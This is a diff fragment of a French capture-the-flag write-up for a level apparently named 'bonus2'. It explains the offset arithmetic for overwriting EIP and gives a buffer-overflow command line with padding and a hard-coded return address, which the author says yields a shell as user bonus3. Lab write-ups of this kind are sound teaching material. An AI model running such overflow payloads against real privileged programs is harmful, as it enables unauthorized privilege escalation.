@@ -79,7 +79,7 @@ Comme pour dans bonus0 je vais lancer le programme avec GDB et placer un breakpo
 Il ne me reste plus qu'a crée l'exploit pour réecrire eip et rediriger le programme vers ma l'addresse de ma variable d'environnement
 Dans le cas ou je choisie nl la string écrite dans le buffer mesure 13 bits je les retires de la taille du buffer (32 - 13 + 4) et je me retrouve avec une taille de buffer de 19 + 4 pour réecrire EIP 23
 
-	./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x9c\xfb\xff\xbf"')
+	./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x9c\xfb\xff\xbf"')
 
 Me voila dans un nouveau shell avec les droits de l'utilisateur bonus3
 
